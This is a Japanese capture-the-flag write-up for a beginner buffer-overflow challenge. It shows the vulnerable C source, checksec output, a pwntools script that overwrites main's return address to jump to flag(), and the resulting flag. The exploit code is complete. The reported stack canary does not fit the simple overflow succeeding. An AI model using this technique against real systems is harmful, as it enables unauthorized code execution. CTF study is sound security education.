## Pwn Me Baby (153pt / 178 solves) [Beginner]
> Baby, please pwn me.
> 
> nc [問題鯖の接続情報]
>
> 添付ファイル: baby-pwn.zip

~~どしたのワサワサ なんでもナーミン~~

攻撃対象のバイナリとそのソースコードが与えられている。そのソースコードを以下に示す。
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
void flag(){
  char buf[128]={0};
  int fd=open("flag.txt",O_RDONLY);
  if(fd==-1){
    puts("Couldn't find flag.txt");
    return;
  }
  read(fd,buf,128);
  puts(buf);
}
int main(void){
  char buf[16];
  printf("I will receive a message and do nothing else:");
  scanf("%s",buf);
  return 0;
}

__attribute__((constructor)) void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
```

典型的なBOFの問題だと分かる。  
checksecの結果は以下の通り。
```
[*] '/dist/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

PIEなし。ありがたい。よってこの問題の目標は`flag()`のアドレスを特定し、`main()`のリターンアドレスをBOFで書き換えることとなる。gdbなどのデバッガを使うと、`flag()`の開始アドレスは`0x401810`であるということと、`main()`の配列`buf`の開始アドレスからリターンアドレスが格納されている場所のアドレスまでのオフセットは`24`であるということが分かる。得られた情報から次に示すソルバを書いた。
```python
from pwn import *

io = remote(host, port)

flag_address = 0x401815

payload = b'A' * 24
payload += pack(flag_address)

io.sendlineafter('I will receive a message and do nothing else:', payload)
io.interactive()
```

変数`flag_address`が`0x401810`でないのは、そのままではスタックのアラインメントに引っ掛かるのか、上手くいかなかったからである。色々なアドレスを試した結果、`0x401815`に落ち着いた。
兎にも角にも、このソルバを実行するとフラグが得られた。
```
$ python3 poc.py 
[+] Opening connection to [host] on port [port]: Done
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
fwectf{bof_b0f_6of_60f}
I will receive a message and do nothing else:[*] Got EOF while reading in interactive
$
```

### `fwectf{bof_b0f_6of_60f}`